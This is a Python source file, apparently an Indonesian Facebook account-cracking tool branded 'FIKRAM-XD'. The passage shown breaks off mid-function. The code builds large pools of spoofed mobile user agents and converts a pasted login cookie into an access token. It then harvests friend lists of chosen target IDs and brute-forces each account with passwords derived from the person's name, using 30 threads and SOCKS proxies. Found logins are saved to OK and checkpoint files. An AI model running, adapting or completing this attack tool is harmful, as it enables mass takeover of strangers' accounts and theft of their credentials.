	f=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	g='UCBrowser/13.4.2.1307 Mobile Safari/537.36'
	uga=f'{a} {b}; {c} {d}) {e}{f} {g}'
	ugen.append(uga) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 14) 
	c='CPH2071 Build/PPR1.180610.011; wv)'
	d=str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9)) 
	e='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	f=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	g='Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/342.0.0.11.89;]'
	uga=f'{a} {b}; {c} {d}) {e}{f} {g}'
	ugen.append(uga) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 14) 
	c='SM-J730G Build/PPR1.180610.011; wv)'
	d=str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9)) 
	e='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	f=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	g='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/413.0.0.30.104;]'
	uga=f'{a} {b}; {c} {d}) {e}{f} {g}'
	ugen.append(uga) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 14) 
	c='SM-A725F Build/TP1A.220624.014; wv)'
	d=str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9)) 
	e='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	f=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	g='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/412.0.0.22.115;]'
	uga=f'{a} {b}; {c} {d}) {e}{f} {g}'
	ugen.append(uga) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 14) 
	c='Doro 8100)'
	d=str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9)) 
	e='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/'
	f=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	g='Mobile Safari/537.36'
	uga=f'{a} {b}; {c} {d}) {e}{f} {g}'
	ugen.append(uga) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 14) 
	c='M2012K11AG Build/TKQ1.220829.002; wv)'
	d=str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9)) 
	e='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	f=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	g='Mobile Safari/537.36'
	uga=f'{a} {b}; {c} {d}) {e}{f} {g}'
	ugen.append(uga) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 14) 
	c='Nexus 5 Build/MRA58N) FxQuantum/113.0'
	d=str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9)) 
	e='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	f=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	g='Mobile Safari/537.36'
	uga=f'{a} {b}; {c} {d}) {e}{f} {g}'
	ugen.append(uga) 
	
for t in range(10000):
	rr = random.randint
	andro=random.choice(['3.0','4.4.2','4.4.4','5.0.1','8.0','7.0','6.0','5.0','4.0','4.3.4','7.0.1','8.0.1','3','4','5','6','7','8','9','10','11','12','13'])
	samsung=random.choice(['SAMSUNG SM-T530','SAMSUNG SM-T530','SAMSUNG SM-T805','SAMSUNG-SM-G530AZ','SAMSUNG SM-G925K','SAMSUNG SM-G925L','SAMSUNG SM-G925T','SAMSUNG-SM-T337A','SAMSUNG SM-J110F','SAMSUNG-SM-G890A','SAMSUNG SM-T355Y','SAMSUNG SM-T817T','SAMSUNG SM-G925F','SAMSUNG SM-G928F','SAMSUNG SM-W2021'])
	redmi=random.choice(['Redmi 4A','Redmi 5A','Redmi 6A','Redmi 7A','Redmi 8A','Redmi Note 3','Redmi Note 9 Pro','Redmi Note 8 Pro','Redmi Note 8','Redmi Note 9','Redmi 3S','Redmi 4X','Redmi 5 Plus','Redmi 9 Prime','Redmi 8 Prime'])
	realme=random.choice(['RMX3115)','RMX3300)','RMX3301)','RMX3612)','RMX3506)','RMX3710)'])
	oppo=random.choice(['PGT110)','CPH2419)','CPH2048)','CPH2451)','PDBM00)','PGBM10)'])
	lenovo=random.choice(['Lenovo K13 Pro)','Lenovo YT-J706F)','Lenovo L78051)','Lenovo L79031)'])
	build=random.choice(['Build/JZO54K)','Build/LMY47V)','Build/LMY48B)','Build/LRX22C)','Build/LRX21V) ','Build/LRX22G)','Build/LRX21T)'])
	build1=random.choice(['Build/N2G47H)','Build/MMB29M)','Build/LMY47X)'])
	browser=random.choice(['SamsungBrowser/3.0','SamsungBrowser/3.1','SamsungBrowser/3.2','SamsungBrowser/3.3','SamsungBrowser/3.4','SamsungBrowser/3.5','SamsungBrowser/3.6','SamsungBrowser/3.7','SamsungBrowser/3.8','SamsungBrowser/3.9','SamsungBrowser/4.0','SamsungBrowser/2.0','SamsungBrowser/2.1','SamsungBrowser/2.2','SamsungBrowser/2.3','SamsungBrowser/2.4','SamsungBrowser/2.5','SamsungBrowser/2.6','SamsungBrowser/2.7','SamsungBrowser/2.8','SamsungBrowser/2.9','SamsungBrowser/1.0','SamsungBrowser/1.1','SamsungBrowser/1.2','SamsungBrowser/5.0','SamsungBrowser/5.1','SamsungBrowser/5.2','SamsungBrowser/5.3','SamsungBrowser/5.4','SamsungBrowser/5.5','SamsungBrowser/5.6','SamsungBrowser/5.7','SamsungBrowser/5.8','SamsungBrowser/5.9','SamsungBrowser/6.0','SamsungBrowser/6.1','SamsungBrowser/19.0','SamsungBrowser/20.0','SamsungBrowser/21.0','SamsungBrowser/18.0','SamsungBrowser/17.0','SamsungBrowser/16.0','SamsungBrowser/15.0'])
	rfn1=f'Mozilla/5.0 (Linux; Android {andro}; {samsung} {build} AppleWebKit/537.36 (KHTML, like Gecko) {browser} Chrome/{str(rr(73,150))}.0.{str(rr(1500,5900))}.{str(rr(75,150))} Mobile Safari/537.36'
	rfn2=f'Mozilla/5.0 (Linux; Android {andro}; {redmi} {build1} AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(1500,5900))}.{str(rr(75,150))} Mobile Safari/537.36'
	rfn3=f'Mozilla/5.0 (Linux; Android {andro}; {realme} AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(1500,5900))}.{str(rr(75,150))} Mobile Safari/537.36'
	rfn4=f'Mozilla/5.0 (Linux; Android {andro}; {oppo} AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(1500,5900))}.{str(rr(75,150))} Mobile Safari/537.36'
	rfn5=f'Mozilla/5.0 (Linux; Android {andro}; {lenovo} AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(1500,5900))}.{str(rr(75,150))} Mobile Safari/537.36'
	uaku2 = random.choice([rfn1,rfn2,rfn3,rfn4,rfn5])
	ugen.append(uaku2)


for xd in range(10000) :
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 19) 
	c='Redmi Note' +str(random.randrange(1, 9))
	d='Pro Build/PKQ1.'+str(random.randrange(100000, 300000))+'.0'+str(random.randrange(1, 30)) 
	e='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/'+str(random.randrange(10, 375))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(10, 400)) 
	f='Mobile Safari/537.36 UCBrowser/'+str(random.randrange(1, 100))+'.'+str(random.randrange(1, 100))+'.'+str(random.randrange(1, 100))+'.'+str(random.randrange(1, 100))
	g='(UCMini) Seluler'
	rafmkz=f'{a} {b}; {c} {d}; wv) {e} {f} {g}'
	ugen.append(rafmkz) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 14) 
	c='RMX'+str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9)) 
	d='Build/PKQ1.'+str(random.randrange(100000, 300000))+'.0'+str(random.randrange(1, 30)) 
	e='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/'+str(random.randrange(10, 375))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(10, 400)) 
	f='Mobile Safari/537.36 UCBrowser/'+str(random.randrange(1, 100))+'.'+str(random.randrange(1, 100))+'.'+str(random.randrange(1, 100))+'.'+str(random.randrange(1, 100))
	g='(UCMini) Seluler'
	rafmkz=f'{a} {b}; {c} {d}; wv) {e} {f} {g}'
	ugen.append(rafmkz) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 19) 
	c='REALME RMX'+str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9)) 
	d='Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'+str(random.randrange(10, 375))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(10, 400)) 
	e='Mobile Safari/537.36'
	rafmkz=f'{a} {b}; {c} {d} {e}'
	ugen.append(rafmkz) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 15) 
	c='HTC 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'+str(random.randrange(10, 375))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(10, 400)) 
	d='Mobile Safari/537.36'
	rafmkz=f'{a} {b}; {c} {d}'
	ugen.append(rafmkz) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 15) 
	c='Micromax A065 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'+str(random.randrange(10, 375))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(10, 400)) 
	d='Mobile Safari/537.36'
	rafmkz=f'{a} {b}; {c} {d}'
	ugen.append(rafmkz) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 15) 
	c='XIAOMI POCO F1 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'+str(random.randrange(10, 375))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(10, 400)) 
	d='Mobile Safari/537.36'
	rafmkz=f'{a} {b}; {c} {d}'
	ugen.append(rafmkz)
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
data, data2 = {}, {}
uadia, uadarimu = [],[]
pwpluss,pwnya=[],[]
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
CY='\033[96;1m' #CYAN
DG='\033[90m'  #DARKGREY
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def FIKRAMGANTENG(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
        
def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();sleep(0.06) 

###-----( Tahun Akun Guyss )-----###
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']:tahunz = '2009'
		elif fx[:9] in ['100000000']:tahunz = '2009'
		elif fx[:8] in ['10000000']:tahunz = '2009'
		elif fx[:7] in ['1000000','1000001',
															'1000002','1000003',
															'1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007',
															'1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']:tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003']:tahunz = '2011-2012'
		elif fx[:6] in ['100004']:tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006']:tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008']:tahunz = '2014-2015'
		elif fx[:6] in ['100009']:tahunz = '2015'
		elif fx[:5] in ['10001']:tahunz = '2015-2016'
		elif fx[:5] in ['10002']:tahunz = '2016-2017'
		elif fx[:5] in ['10003']:tahunz = '2018'
		elif fx[:5] in ['10004']:tahunz = '2019'
		elif fx[:5] in ['10005']:tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		elif fx[:5] in ['10009']:tahunz = '2023'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz

def clear():
	os.system('clear')
def back():
	login()
#---------[ BANNER ORANG GANTENG ]---------#
def banner():
	clear()
	print(f"""{asu}
╭━╮╭━┳━━━╮╱╱╭━━━━┳━━━┳╮╱╭┳━━━┳━━━┳━━━┳━━━╮
┃┃╰╯┃┃╭━╮┃╱╱┃╭╮╭╮┃╭━╮┃┃╱┃┃╭━━┻╮╭╮┃╭━━┫╭━━╯
┃╭╮╭╮┃╰━╯┃╱╱╰╯┃┃╰┫┃╱┃┃╰━╯┃╰━━╮┃┃┃┃╰━━┫╰━━╮
┃┃┃┃┃┃╭╮╭╯╱╱╱╱┃┃╱┃╰━╯┃╭━╮┃╭━━╯┃┃┃┃╭━━┫╭━━╯
┃┃┃┃┃┃┃┃╰╮╭╮╱╱┃┃╱┃╭━╮┃┃╱┃┃╰━━┳╯╰╯┃╰━━┫╰━━┳╮
╰╯╰╯╰┻╯╰━╯╰╯╱╱╰╯╱╰╯╱╰┻╯╱╰┻━━━┻━━━┻━━━┻━━━┻┫
╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╯
\033[1;92m===============================================
\033[0;92m[\033[0;92m ⚘ \033[0;92m] Coded By   : MOHAMMAD FIKRAM XD.
\033[0;92m[\033[0;92m ⚘ \033[0;92m] Facebook   : MOHAMMAD FIKRAM
\033[0;92m[\033[0;92m ⚘ \033[0;92m] Github     : https://github.com/fikramxd/
\033[0;92m[\033[0;92m ⚘ \033[0;92m] Whatsapps  : 085824034302
\033[0;92m[\033[0;92m ⚘ \033[0;92m] Status     : UJI COBA
\033[0;92m\033[0;92m=============================================== 
{x}""")


	
#--------------------[ BAGIAN-MASUK ]--------------#
def logindulufik():
      global data,data2
      banner()
      print(f"""\n{H}
╔══════════════════════════════════════╗{N}
{H}║{N} Login Extension {B}(𝐶𝑂𝑂𝐾𝐼𝐸𝐷𝑂𝑈𝐺𝐻){N} Di KIWI{H}
╚══════════════════════════════════════╝{N} """)
      cok = input(f'\n{b}[•] {m}——> {h}Masukan Cokies Anda{N} : ')
      try:
            link = ses.post('https://graph.facebook.com/v17.0/device/login/', data={'access_token': '661587963994814|ffe07cc864fd1dc8fe386229dcb7a05e', 'scope': ''}).json()
            kode,user = link['code'],link['user_code']
            vers = parse(ses.get(f'https://mbasic.facebook.com/device', cookies={'cookie': cok}).content, 'html.parser')
            item = ['fb_dtsg','jazoest','qr']
            for x in vers.find_all('input'):
                  if x.get('name') in item:
                        aset = {x.get('name'):x.get('value')}
                        data.update(aset)
            data.update({'user_code':user})
            meta = parse(ses.post('https://mbasic.facebook.com'+vers.find('form', method='post').get('action'), data=data, cookies={'cookie': cok}).text, 'html.parser')
            xzxz  = meta.find('form',{'method':'post'})
            for x in xzxz('input',{'value':True}):
                  try:
                        if x['name'] == '__CANCEL__' : pass
                        else:
                              data2.update({x['name']:x['value']})
                  except Exception as e:pass
            ses.post(f'https://mbasic.facebook.com{xzxz["action"]}', data=data2, cookies={'cookie':cok})
            token = ses.get(f'https://graph.facebook.com/v16.0/device/login_status?method=post&code={kode}&access_token=661587963994814|ffe07cc864fd1dc8fe386229dcb7a05e').json()['access_token']
            open(".token.txt", "w").write(token)
            open(".cok.txt", "w").write(cok)
            print('\n[√] Akses Token Anda :'+token)
            
            print('\n Login Kembali KETIK : TAHEDE.py')
            
      except(KeyError):exit('\n[x] Login Gagal')

def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+token, cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			logindulufik()
		except requests.exceptions.ConnectionError:
			print('[!!!] ConnectionError')
			exit()
	except IOError:
		logindulufik()
		
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Cookies Anda telah modar ')
		time.sleep(2)
		logindulufik()
	os.system('clear')
### BANNER MENU ORANG GANTENG###
	banner()
	ip = requests.get("https://api.ipify.org").text
	print('')
	cetak(nel('\t[cyan]H I-SELAMAT - DATANG [bold green](%s) [cyan]DI SCRIPT FIKRAM-XD'%(my_name),width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white] 🔰 [bold red]• [bold yellow]• [bold green]•"))
	print('')
	cetak(nel('\t[cyan]M  E  N  U - C  R  A  C  K ',width=45,title=f"[bold green]• [bold yellow]• [bold red]• [bold white] 🔰 [bold red]• [bold yellow]• [bold green]•"))
	print(f'\n╚═══ [{h}01{x}] Crack ID Public {b}(Massal){x} ')
	print(f'\n╚═══ [{h}02{x}] Cek hasil Crack  ')
	print(f'\n╚═══ [{h}03{x}] Log Out + Hapus COOKIES      ')
	_fik_xd_ = input('\n╚═══ Pilih : ')
	if _fik_xd_ in ['1']:
		dump_massal()
	elif _fik_xd_ in ['2']:
		result()
	elif _fik_xd_ in ['3']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('[√√√] Berhasil logout & hapus cookie')
		exit()
	else:
		print('╚═══ [!!!] Pilih Yang Bener Kontoll')
		back()
#------------------[ BAGIAN-CEK HASIL ]----------------#
def result():
	print(f'')
	print(f'\n╚═══ [{h}01{x}] Hasil {h}OK{x} kamu ')
	print(f'\n╚═══ [{h}02{x}] Hasil {k}CP{x} kamu ')
	print(f'\n╚═══ [{h}03{x}] Kembali	')
	kz = input(f'\n[?] ╚═══ Pilih : ')
	if kz in ['2','02']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(' File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print(' Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'(%s) %s {k}%s{x} akun'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'(%s) %s {k}%s{x} akun'%(cih,isi,(len(hem))))
			geeh = input(f'\n(?) ╚═══ Pilih  : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' Pilih Yang Bener KONTOL ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{x}{k}╚═══ {cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			print('')
			input(f'{x} ╚═══ Click enter ')
			back()
	elif kz in ['1','01']: 
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print(' File Tidak Di Temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('Tidak Mempunyai File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'[%s] %s {h}%s{x} akun'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'[%s] %s {h}%s{x} akun'%(cih,isi,(len(hem))))
			geeh = input(f'\n ╚═══ Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' Pilih Yang Bener KONTOL ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{x}{H}╚═══ {cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}{x}')
				nocp +=1
			print('')
			input(f' ╚═══ Click Enter Bre ')
			back()
	elif kz in ['3','03']:
		back()
	else:
		print('Pilih Yang Bener Yah KONTOL ')
		exit()
#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		print('')
		jum = int(input(' ╚═══ Mau berapa id target  ? : '))
	except ValueError:
		print('[!!!] Masukkan pilihan yang benar Kontoll ')
		exit()
	if jum<1 or jum>100:
		print('[!!!] Gagal dump id ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input('[+] ╚═══ Masukkan idz yang ke '+str(yz)+'  : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+token, cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('[!] ConnectionError')
			exit()
	try:
		print(f' ╚═══ [ √√√ ] Total id yang terkumpul : {H}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('[!!!] ConnectionError')
		back()
	except (KeyError,IOError):
		print(f'[!!!] Pertemanan tidak public')
		time.sleep(3)
		back()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print('')
	cetak(nel(f' DISARANKAN RANDOM SAJA ',width=45,title=f"[bold green]• [bold yellow]• [bold red]• [bold white] 🔰 [bold red]• [bold yellow]• [bold green]•"))
	print(f'\n╚═══ [{h}01{x}] Crack dari id new')
	print(f'\n╚═══ [{h}02{x}] Crack dari id random')
	print('')
	hu = input(' ╚═══ Pilih : ')
	if hu in ['1','01']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['2','02']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('Pilih Yang Bener Kontooll ')
		exit()
	print('')
	cetak(nel(f' PILIH METODE LOGIN ',width=45,title=f"[bold green]• [bold yellow]• [bold red]• [bold white] 🔰 [bold red]• [bold yellow]• [bold green]•"))
	print(f'\n╚═══ [{h}01{x}] Metode {H}REGULER_NEW {B}M.facebook.com{x} ')
	print(f'\n╚═══ [{h}02{x}] Metode {H}VALIDATE {B}M.facebook.com{x} ')
	print(f'\n╚═══ [{h}03{x}] Metode Free.facebook.com {M} BELUM UPDATE !!!{x} ')
	print('')
	hc = input(' ╚═══ Pilih : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2','02']:
		method.append('mobile')
	elif hc in ['3','03']:
		method.append('free')
	else:
		method.append('mobile')
	print('')
	pwplus=input(' ╚═══ [ ? ] Apakah Akan Menggunakan Password Manual y/t : ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		print(f' Masukan password manual anda minimal {B}6{x} karakter\n[!] Contoh : {M}Sayang,Kontol,Memek{x}')
		pwku=input(' ╚═══ Masukan Password Manual Anda : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	ua = input(f' [{b}?{x}] Use manual user agent ? ({h}y{x}/{m}t{x}) : ')
	if ua in ['y','Ya','ya','Y']:
		uadarimu.append('uadia');bz = input(f' [{b}?{x}] Input your user agent : ');uadia.append(bz)
	else:uadarimu.append('uasc')
	passwrd()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	global prog,des
	print(f'')
	print(f'Semua Hasil Crack Anda Tesimpan Di File : {CY}/sdcard/Fikram_XD{N}')
	print(f'[😘] Hasil {H}𝗢𝗞 Anda{N} Tersimpan Di : %s '%(okc))
	print(f'[😂] Hasil {K}𝗖𝗣 Anda{N} Tersimpan Di : %s '%(cpc))
	cetak(nel(f'[!!!] Mohon Mainkan mode pesawat jika tidak ada hasil\n',width=50,title=f"[bold green]• [bold yellow]• [bold red]• [bold white] 🔰 [bold red]• [bold yellow]• [bold green]•"))
	prog = Progress(SpinnerColumn('earth'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile_reg' in method:
					pool.submit(crack_mobile,idf,pwv)
				elif 'mobile' in method:
					pool.submit(crack_mobile,idf,pwv)
				elif 'free' in method:
					pool.submit(crack_free,idf,pwv)
				else:
					pool.submit(crack,idf,pwv)
	print(f'[•] Hasil - OK : {H}%s{N} '%(ok))
	print(f'[•] Hasil - CP : {K}%s{N} '%(cp))
#----[ METODE-MOBILE-REGULER NEW]----#
def crack_mobile_reg(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[cyan]𝗧𝗔𝗛𝗘𝗗𝗘[/] [deep_white]{(loop)}/{len(id)}[/] [bold green]😘𝗢𝗞[/]:[bold green]{(ok)} [/]=[bold yellow] 😂𝗖𝗣[/]:[bold yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(ugen)
	#ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=588405863272511&kid_directed_site=0&app_id=588405863272511&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D588405863272511%26redirect_uri%3Dhttps%253A%252F%252Fwww.primeopinion.com%252Fauth%252Fsocial%253Fprovider%253Dfacebook%26scope%3Demail%26response_type%3Dcode%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D21079cbf-2bba-46bf-9b0d-955ae9276b8c%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.primeopinion.com%2Fauth%2Fsocial%3Fprovider%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
